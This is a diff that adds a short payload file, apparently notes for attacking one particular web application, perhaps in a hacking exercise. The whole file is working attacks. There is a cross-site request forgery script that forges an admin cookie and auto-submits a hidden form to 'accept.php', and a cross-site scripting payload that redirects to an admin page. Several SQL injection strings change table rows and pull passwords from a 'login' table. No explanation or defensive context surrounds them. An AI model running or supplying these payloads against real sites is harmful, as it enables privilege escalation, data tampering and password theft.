@@ -1,0 +1,15 @@
+
+
+//xsrf
+<script>document.cookie="NICK=admin";var form = document.createElement("form");form.setAttribute("method", "post");form.setAttribute("action", "accept.php");var hiddenField = document.createElement("input");hiddenField.setAttribute("type", "hidden");hiddenField.setAttribute("name", "id");hiddenField.setAttribute("value", "32");form.appendChild(hiddenField);document.body.appendChild(form);form.submit();document.cookie="NICK=USER"</script>
+
+//xss
+<script>document.cookie="NICK=admin";document.location.href="adminForm.php";</script>
+
+//sql
+//if multistatement
+USER";UPDATE historia SET CONFIRM=1 where ID=34;SELECT PASS FROM login where NICK="USER
+
+IDK" UNION SELECT PASS FROM login where NICK="RERE
+
+USER" OR ""="
